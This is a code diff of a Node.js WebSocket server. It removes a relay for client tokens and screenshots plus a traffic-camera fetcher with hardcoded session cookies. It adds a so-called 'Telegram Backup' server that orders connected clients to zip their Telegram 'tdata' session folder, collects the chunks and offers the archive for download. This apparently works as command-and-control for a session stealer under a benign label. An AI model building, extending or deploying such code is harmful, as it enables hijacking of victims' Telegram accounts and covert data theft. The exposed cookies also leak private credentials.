@@ -2,11 +2,12 @@ import http from 'http';
 import express from 'express';
 import { WebSocket, WebSocketServer } from 'ws';
 import crypto from 'crypto';
-import fetch from 'node-fetch';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import geoip from 'geoip-lite';
 import UAParser from 'ua-parser-js';
+import fs from 'fs';
+import os from 'os';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -16,22 +17,44 @@ const PORT = process.env.PORT || 3000;
 const server = http.createServer(app);
 const wss = new WebSocketServer({ noServer: true });
 
+// Configuration
+const CONFIG = {
+    MAX_CHUNK_SIZE: 64 * 1024, // 64KB
+    BACKUP_TIMEOUT: 30 * 60 * 1000, // 30 minutes
+    HEARTBEAT_INTERVAL: 30000, // 30 seconds
+    TEMP_DIR: path.join(os.tmpdir(), 'telegram_backup_server')
+};
+
+// Ensure temp directory exists
+if (!fs.existsSync(CONFIG.TEMP_DIR)) {
+    fs.mkdirSync(CONFIG.TEMP_DIR, { recursive: true });
+}
+
 server.on('upgrade', (request, socket, head) => {
     wss.handleUpgrade(request, socket, head, ws => {
         wss.emit('connection', ws, request);
     });
 });
 
-// WebSocket logic
-const usersInChat = new Map();
-const pictureReceivers = new Map(); 
+// Connection management
+const connections = new Map();
+const telegramBackupClients = new Map();
+const controllerClients = new Map();
 const monitorConnections = new Set();
+const activeBackups = new Map();
 let keepAliveId = null;
 
 wss.on("connection", (ws, req) => {
     const userID = crypto.randomUUID();
     const clientInfo = extractClientInfo(ws, req);
-    usersInChat.set(userID, clientInfo);
+    
+    connections.set(userID, {
+        ws: ws,
+        info: clientInfo,
+        type: 'unknown'
+    });
+
+    console.log(`[${new Date().toISOString()}] New connection: ${userID} from ${clientInfo.ip}`);
 
     ws.on("message", (data) => {
         handleMessage(ws, data, userID);
@@ -41,6 +64,12 @@ wss.on("connection", (ws, req) => {
         handleDisconnect(userID, ws);
     });
 
+    ws.on("error", (error) => {
+        console.error(`[${new Date().toISOString()}] WebSocket error for ${userID}:`, error);
+        handleDisconnect(userID, ws);
+    });
+
+    // Start keep alive if first connection
     if (wss.clients.size === 1 && !keepAliveId) {
         keepServerAlive();
     }
@@ -58,68 +87,389 @@ wss.on("close", () => {
 const handleMessage = (ws, data, userID) => {
     try {
         const messageData = JSON.parse(data.toString());
+        const connection = connections.get(userID);
         
-        if (messageData.type === 'monitor') {
-            monitorConnections.add(ws);
-            sendClientUpdate();
-        } else if (messageData.command === 'Picture Receiver') {
-            pictureReceivers.set(userID, ws);
-        } else if (messageData.type === 'token' && messageData.sender && messageData.token && messageData.uuid && messageData.ip) {
-            broadcastToPictureReceivers(messageData);
-        } else if (messageData.type === 'screenshot' && messageData.data && typeof messageData.data === 'string' && messageData.data.startsWith('data:image/png;base64')) {
-            broadcastToPictureReceivers({
-                type: 'screenshot',
-                action: messageData.action,
-                screen: messageData.screen,
-                data: messageData.data
-            });
-        } else if (messageData.action === 'screenshot_result') {
-            broadcastToPictureReceivers({
-                type: 'screenshot',
-                action: messageData.action,
-                screen: messageData.screen,
-                data: messageData.data
-            });
-        } else {
-            broadcastToAllExceptPictureReceivers(ws, JSON.stringify(messageData), true);
-        }
+        if (!connection) return;
 
         // Update last active time
-        const clientInfo = usersInChat.get(userID);
-        if (clientInfo) {
-            clientInfo.lastActiveTime = new Date().toISOString();
-            usersInChat.set(userID, clientInfo);
-            sendClientUpdate();
+        connection.info.lastActiveTime = new Date().toISOString();
+
+        // Handle different message types
+        switch (messageData.type) {
+            case 'monitor':
+                handleMonitorConnection(ws, userID);
+                break;
+                
+            case 'telegram_backup_register':
+                handleTelegramBackupRegister(ws, userID, messageData);
+                break;
+                
+            case 'telegram_backup_ready':
+                handleTelegramBackupReady(ws, userID, messageData);
+                break;
+                
+            case 'set_tdata_path':
+                handleSetTdataPath(messageData);
+                break;
+                
+            case 'backup_command':
+                handleBackupCommand(messageData);
+                break;
+                
+            case 'telegram_backup_cancel':
+                handleBackupCancel();
+                break;
+                
+            case 'tdata_path_confirmed':
+                handleTdataPathConfirmed(messageData);
+                break;
+                
+            case 'telegram_backup_status':
+                handleBackupStatus(messageData);
+                break;
+                
+            case 'telegram_backup_start':
+                handleBackupStart(messageData);
+                break;
+                
+            case 'telegram_backup_chunk':
+                handleBackupChunk(messageData);
+                break;
+                
+            case 'telegram_backup_complete':
+                handleBackupComplete(messageData);
+                break;
+                
+            case 'backup_error':
+                handleBackupError(messageData);
+                break;
+                
+            case 'heartbeat':
+                // Just update last active time (already done above)
+                break;
+                
+            default:
+                // Forward other messages to all clients except sender
+                broadcastToAll(ws, JSON.stringify(messageData), false);
         }
+
+        sendClientUpdate();
     } catch (e) {
-        console.error('Error parsing or processing message:', e);
-        console.error('Raw message data:', data);
+        console.error(`[${new Date().toISOString()}] Error processing message from ${userID}:`, e);
+        console.error('Raw message data:', data.toString().substring(0, 200) + '...');
     }
 };
 
-const broadcastToPictureReceivers = (message) => {
-    const data = JSON.stringify(message);
-    pictureReceivers.forEach((ws, userId) => {
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.send(data, error => {
-                if (error) console.error("Error sending message to receiver:", error);
-            });
+// Message handlers
+const handleMonitorConnection = (ws, userID) => {
+    monitorConnections.add(ws);
+    const connection = connections.get(userID);
+    if (connection) {
+        connection.type = 'monitor';
+    }
+    console.log(`[${new Date().toISOString()}] Monitor connected: ${userID}`);
+};
+
+const handleTelegramBackupRegister = (ws, userID, messageData) => {
+    telegramBackupClients.set(userID, {
+        ws: ws,
+        platform: messageData.platform,
+        ready: false,
+        pathSet: false
+    });
+    
+    const connection = connections.get(userID);
+    if (connection) {
+        connection.type = 'telegram_backup';
+        connection.info.platform = messageData.platform;
+    }
+    
+    console.log(`[${new Date().toISOString()}] Telegram backup client registered: ${userID} (${messageData.platform})`);
+    
+    // Notify controllers
+    broadcastToControllers({
+        type: 'telegram_backup_register',
+        clientId: userID,
+        platform: messageData.platform,
+        timestamp: messageData.timestamp
+    });
+};
+
+const handleTelegramBackupReady = (ws, userID, messageData) => {
+    const client = telegramBackupClients.get(userID);
+    if (client) {
+        client.ready = true;
+    }
+    
+    console.log(`[${new Date().toISOString()}] Telegram backup client ready: ${userID}`);
+    
+    // Notify controllers
+    broadcastToControllers({
+        type: 'telegram_backup_ready',
+        clientId: userID,
+        platform: messageData.platform,
+        timestamp: messageData.timestamp
+    });
+};
+
+const handleSetTdataPath = (messageData) => {
+    console.log(`[${new Date().toISOString()}] Setting tdata path: ${messageData.path}`);
+    
+    // Forward to telegram backup clients
+    telegramBackupClients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify(messageData));
         }
     });
 };
 
-const broadcastToAllExceptPictureReceivers = (senderWs, message, includeSelf) => {
+const handleBackupCommand = (messageData) => {
+    const backupId = messageData.backupId || `backup_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
+    
+    console.log(`[${new Date().toISOString()}] Starting backup: ${backupId}`);
+    
+    // Initialize backup tracking
+    activeBackups.set(backupId, {
+        id: backupId,
+        startTime: Date.now(),
+        chunks: new Map(),
+        totalChunks: 0,
+        filename: null,
+        totalSize: 0,
+        status: 'started'
+    });
+    
+    // Forward to telegram backup clients
+    const command = {
+        ...messageData,
+        type: 'backup_command',
+        backupId: backupId
+    };
+    
+    telegramBackupClients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN && client.ready && client.pathSet) {
+            client.ws.send(JSON.stringify(command));
+        }
+    });
+    
+    // Set timeout for backup
+    setTimeout(() => {
+        if (activeBackups.has(backupId)) {
+            console.log(`[${new Date().toISOString()}] Backup timeout: ${backupId}`);
+            activeBackups.delete(backupId);
+            broadcastToControllers({
+                type: 'telegram_backup_status',
+                backupId: backupId,
+                status: 'timeout',
+                error: 'Backup timed out',
+                timestamp: new Date().toISOString()
+            });
+        }
+    }, CONFIG.BACKUP_TIMEOUT);
+};
+
+const handleBackupCancel = () => {
+    console.log(`[${new Date().toISOString()}] Cancelling all backups`);
+    
+    // Clear active backups
+    activeBackups.clear();
+    
+    // Forward to telegram backup clients
+    telegramBackupClients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(JSON.stringify({ type: 'telegram_backup_cancel' }));
+        }
+    });
+    
+    // Notify controllers
+    broadcastToControllers({
+        type: 'telegram_backup_cancel',
+        timestamp: new Date().toISOString()
+    });
+};
+
+const handleTdataPathConfirmed = (messageData) => {
+    console.log(`[${new Date().toISOString()}] Tdata path confirmed: ${messageData.path}`);
+    
+    // Update client status
+    telegramBackupClients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.pathSet = true;
+        }
+    });
+    
+    // Forward to controllers
+    broadcastToControllers(messageData);
+};
+
+const handleBackupStatus = (messageData) => {
+    const backup = activeBackups.get(messageData.backupId);
+    if (backup) {
+        backup.status = messageData.status;
+        
+        if (messageData.status === 'completed' || messageData.status === 'failed') {
+            // Cleanup after delay
+            setTimeout(() => {
+                activeBackups.delete(messageData.backupId);
+                cleanupBackupFiles(messageData.backupId);
+            }, 60000); // 1 minute delay
+        }
+    }
+    
+    console.log(`[${new Date().toISOString()}] Backup status: ${messageData.backupId} - ${messageData.status}`);
+    
+    // Forward to controllers
+    broadcastToControllers(messageData);
+};
+
+const handleBackupStart = (messageData) => {
+    const backup = activeBackups.get(messageData.backupId);
+    if (backup) {
+        backup.filename = messageData.filename;
+        backup.status = 'creating_zip';
+    }
+    
+    console.log(`[${new Date().toISOString()}] Backup ZIP creation started: ${messageData.filename}`);
+    
+    // Forward to controllers
+    broadcastToControllers(messageData);
+};
+
+const handleBackupChunk = (messageData) => {
+    const backup = activeBackups.get(messageData.backupId);
+    if (!backup) {
+        console.error(`[${new Date().toISOString()}] Received chunk for unknown backup: ${messageData.backupId}`);
+        return;
+    }
+    
+    // Store chunk
+    backup.chunks.set(messageData.chunkIndex, {
+        data: messageData.data,
+        size: messageData.size,
+        received: Date.now()
+    });
+    
+    console.log(`[${new Date().toISOString()}] Received chunk ${messageData.chunkIndex} for backup ${messageData.backupId} (${messageData.size} bytes)`);
+    
+    // Forward to controllers (without the actual data to save bandwidth)
+    broadcastToControllers({
+        type: 'telegram_backup_chunk',
+        backupId: messageData.backupId,
+        chunkIndex: messageData.chunkIndex,
+        size: messageData.size,
+        totalChunks: backup.chunks.size
+    });
+};
+
+const handleBackupComplete = (messageData) => {
+    const backup = activeBackups.get(messageData.backupId);
+    if (!backup) {
+        console.error(`[${new Date().toISOString()}] Backup complete for unknown backup: ${messageData.backupId}`);
+        return;
+    }
+    
+    backup.totalSize = messageData.totalSize;
+    backup.totalChunks = messageData.totalChunks;
+    backup.status = 'completed';
+    
+    console.log(`[${new Date().toISOString()}] Backup completed: ${messageData.backupId} - ${(messageData.totalSize / 1024 / 1024).toFixed(2)}MB`);
+    
+    // Reconstruct and save file
+    reconstructBackupFile(messageData.backupId)
+        .then(() => {
+            console.log(`[${new Date().toISOString()}] Backup file reconstructed: ${messageData.backupId}`);
+        })
+        .catch(error => {
+            console.error(`[${new Date().toISOString()}] Error reconstructing backup file:`, error);
+        });
+    
+    // Forward to controllers
+    broadcastToControllers(messageData);
+};
+
+const handleBackupError = (messageData) => {
+    console.error(`[${new Date().toISOString()}] Backup error: ${messageData.error}`);
+    
+    // Forward to controllers
+    broadcastToControllers(messageData);
+};
+
+// Utility functions
+const reconstructBackupFile = async (backupId) => {
+    const backup = activeBackups.get(backupId);
+    if (!backup || !backup.filename) return;
+    
+    try {
+        const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
+        const writeStream = fs.createWriteStream(filePath);
+        
+        // Sort chunks by index and write to file
+        const sortedChunks = Array.from(backup.chunks.entries())
+            .sort(([a], [b]) => a - b);
+        
+        for (const [index, chunk] of sortedChunks) {
+            const buffer = Buffer.from(chunk.data, 'base64');
+            writeStream.write(buffer);
+        }
+        
+        writeStream.end();
+        
+        return new Promise((resolve, reject) => {
+            writeStream.on('finish', () => {
+                console.log(`[${new Date().toISOString()}] File saved: ${filePath}`);
+                resolve(filePath);
+            });
+            writeStream.on('error', reject);
+        });
+    } catch (error) {
+        console.error(`[${new Date().toISOString()}] Error reconstructing file:`, error);
+        throw error;
+    }
+};
+
+const cleanupBackupFiles = (backupId) => {
+    const backup = activeBackups.get(backupId);
+    if (backup && backup.filename) {
+        const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
+        fs.unlink(filePath, (err) => {
+            if (err && err.code !== 'ENOENT') {
+                console.error(`[${new Date().toISOString()}] Error cleaning up file:`, err);
+            } else {
+                console.log(`[${new Date().toISOString()}] Cleaned up file: ${filePath}`);
+            }
+        });
+    }
+};
+
+const broadcastToControllers = (message) => {
+    const data = JSON.stringify(message);
+    controllerClients.forEach((client, clientId) => {
+        if (client.ws.readyState === WebSocket.OPEN) {
+            client.ws.send(data);
+        }
+    });
+};
+
+const broadcastToAll = (senderWs, message, includeSelf) => {
     wss.clients.forEach(client => {
-        if (!pictureReceivers.has(client) && client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
+        if (client.readyState === WebSocket.OPEN && (includeSelf || client !== senderWs)) {
             client.send(message);
         }
     });
 };
 
 const handleDisconnect = (userID, ws) => {
-    usersInChat.delete(userID);
-    pictureReceivers.delete(userID);
+    const connection = connections.get(userID);
+    
+    if (connection) {
+        console.log(`[${new Date().toISOString()}] Disconnected: ${userID} (${connection.type})`);
+    }
+    
+    connections.delete(userID);
+    telegramBackupClients.delete(userID);
+    controllerClients.delete(userID);
     monitorConnections.delete(ws);
+    
     sendClientUpdate();
 };
 
@@ -127,10 +477,10 @@ const keepServerAlive = () => {
     keepAliveId = setInterval(() => {
         wss.clients.forEach(client => {
             if (client.readyState === WebSocket.OPEN) {
-                client.ping(); 
+                client.ping();
             }
         });
-    }, 30000);
+    }, CONFIG.HEARTBEAT_INTERVAL);
 };
 
 function extractClientInfo(ws, req) {
@@ -176,14 +526,25 @@ function extractClientInfo(ws, req) {
 }
 
 function sendClientUpdate() {
-    const clientData = Array.from(usersInChat.entries()).map(([id, clientInfo]) => ({
+    const clientData = Array.from(connections.entries()).map(([id, connection]) => ({
         id,
-        info: clientInfo
+        type: connection.type,
+        info: connection.info
     }));
+    
     const updateMessage = JSON.stringify({
         type: 'clientUpdate',
-        clients: clientData
+        clients: clientData,
+        activeBackups: Array.from(activeBackups.values()).map(backup => ({
+            id: backup.id,
+            status: backup.status,
+            filename: backup.filename,
+            totalSize: backup.totalSize,
+            chunksReceived: backup.chunks.size,
+            totalChunks: backup.totalChunks
+        }))
     });
+    
     monitorConnections.forEach(ws => {
         if (ws.readyState === WebSocket.OPEN) {
             ws.send(updateMessage);
@@ -191,88 +552,78 @@ function sendClientUpdate() {
     });
 }
 
-// Camera viewer logic
-const cameraGroups = [
-    {
-        name: "Lộ trình chị Thủy",
-        cameras: [
-            {id: "5d8cdb9f766c880017188968", name: "Camera 1"},
-            {id: "58ad69c4bd82540010390be7", name: "Camera 2"},
-            {id: "587ee2aeb807da0011e33d52", name: "Camera 3"},
-            {id: "587ed91db807da0011e33d4e", name: "Camera 4"},
-            {id: "5a606a958576340017d06621", name: "Camera 5"},
-            {id: "5d9ddec9766c880017188c9c", name: "Camera 6"}
-        ]
-    },
-    {
-        name: "Lộ trình Q4",
-        cameras: [
-            {id: "6623e9e96f998a001b2525ce", name: "Camera Q4-1"},
-            {id: "6623ea416f998a001b25260a", name: "Camera Q4-2"},
-            {id: "6623e2e16f998a001b252233", name: "Camera Q4-3"},
-            {id: "58b5752e17139d0010f35d5f", name: "Camera Q4-4"},
-            {id: "662b85031afb9c00172dd0dc", name: "Camera Q4-5"}
-        ]
-    }
-];
-
-const headers = {
-    "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
-    "accept-language": "en-US,en;q=0.9,vi;q=0.8",
-    "cache-control": "no-cache",
-    "pragma": "no-cache",
-    "cookie": "ASP.NET_SessionId=tvjf3gj0t0iedy12xgwkguzd; .VDMS=C371EE8E7B9CE151C954199B928DB4C56705D1882054902ECE5E7A36BDE27417DA815B9BA689F84C491E3113D1E0E81B0A87E2AA97FC6D4E5D4A63AB0B7F950D1E31EB524760AE01D517054B5EA183BC4272C905FF6B7B878D1B59539FC702CAF62C829E4A621DAD897F8C5D127972C658CCA6ED; _frontend=!UzLlJ/oR897uggP3xOTVoJth7yoQDv2Ym071q7PnFZbn10OBAq+wheuefT5wExfVIYu5Umkoj3wREac=; CurrentLanguage=vi; TS01e7700a=0150c7cfd1059167ca144761efe2f8515248fb12fde7e6fb26407dc90ed54d38475c733d0c704e1bf8a11ad686e6f21123a2532bde0a59b13db0c3c81edc173952e969e57a0a0784558c335674f500e89088313f4eaca7cd5144d2014298e2ca807e8a7b86; TSb224dc8e027=08a5ec0864ab2000112687e2e80079498069f823b24db1765e8be71e587b56d2e8d2b5995e42e30508728b9b9111300028f4fc2e4ef4a40786ded0b4172649b82ebffdaad5ca04a07a630ec5275bcfe19705cee743b147badb4a5f0990465ed8; TS3d206961027=08a5ec0864ab20009f47610b3c612079307447f1476bd583d4799756a8685d085bed33f47bb238da083de6bd5f11300033a13894befee3dccadfe6076e46c465cc89234c4ac402459d656987a2b7533be74a91357d377d30ea1c57e676ec0098",
-    "Referer": "http://giaothong.hochiminhcity.gov.vn/",
-    "Referrer-Policy": "strict-origin-when-cross-origin"
-};
-
-async function fetchImage(id) {
-    const baseUrl = "http://giaothong.hochiminhcity.gov.vn/render/ImageHandler.ashx";
-    const cameraUrl = `${baseUrl}?id=${id}&t=${Date.now()}`;
-    try {
-        const response = await fetch(cameraUrl, { headers });
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return await response.buffer();
-    } catch (error) {
-        console.error(`Error fetching image for camera ${id}:`, error);
-        return null;
-    }
-}
-
 // Routes
 app.get('/', (req, res) => {
     res.setHeader('Cache-Control', 'no-store');
-    res.status(200).send('');
-});
-
-app.get('/camera', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.status(200).send('Telegram Backup WebSocket Server');
 });
 
 app.get('/monitor', (req, res) => {
     res.sendFile(path.join(__dirname, 'monitor.html'));
 });
 
-app.get('/image/:id', async (req, res) => {
-    const imageBuffer = await fetchImage(req.params.id);
-    if (imageBuffer) {
-        res.writeHead(200, { 'Content-Type': 'image/jpeg' });
-        res.end(imageBuffer);
-    } else {
-        res.status(500).send('Error fetching image');
-    }
+app.get('/controller', (req, res) => {
+    res.sendFile(path.join(__dirname, 'controller.html'));
 });
 
-app.get('/data', (req, res) => {
-    res.json(cameraGroups);
+app.get('/status', (req, res) => {
+    res.json({
+        connections: connections.size,
+        telegramClients: telegramBackupClients.size,
+        controllers: controllerClients.size,
+        monitors: monitorConnections.size,
+        activeBackups: activeBackups.size,
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        timestamp: new Date().toISOString()
+    });
+});
+
+app.get('/backups', (req, res) => {
+    const backups = Array.from(activeBackups.values()).map(backup => ({
+        id: backup.id,
+        status: backup.status,
+        filename: backup.filename,
+        totalSize: backup.totalSize,
+        chunksReceived: backup.chunks.size,
+        totalChunks: backup.totalChunks,
+        startTime: backup.startTime
+    }));
+    
+    res.json(backups);
+});
+
+app.get('/download/:backupId', (req, res) => {
+    const backup = activeBackups.get(req.params.backupId);
+    if (!backup || !backup.filename) {
+        return res.status(404).json({ error: 'Backup not found' });
+    }
+    
+    const filePath = path.join(CONFIG.TEMP_DIR, backup.filename);
+    if (!fs.existsSync(filePath)) {
+        return res.status(404).json({ error: 'Backup file not found' });
+    }
+    
+    res.download(filePath, backup.filename);
 });
 
 app.get('/node-version', (req, res) => {
     res.send(`Node.js version: ${process.version}`);
 });
 
+// Cleanup on exit
+process.on('SIGINT', () => {
+    console.log('\n[SHUTDOWN] Cleaning up...');
+    
+    // Clean up temp files
+    if (fs.existsSync(CONFIG.TEMP_DIR)) {
+        fs.rmSync(CONFIG.TEMP_DIR, { recursive: true, force: true });
+    }
+    
+    process.exit(0);
+});
+
 server.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+    console.log(`[${new Date().toISOString()}] Telegram Backup Server running on port ${PORT}`);
+    console.log(`[${new Date().toISOString()}] Temp directory: ${CONFIG.TEMP_DIR}`);
 });
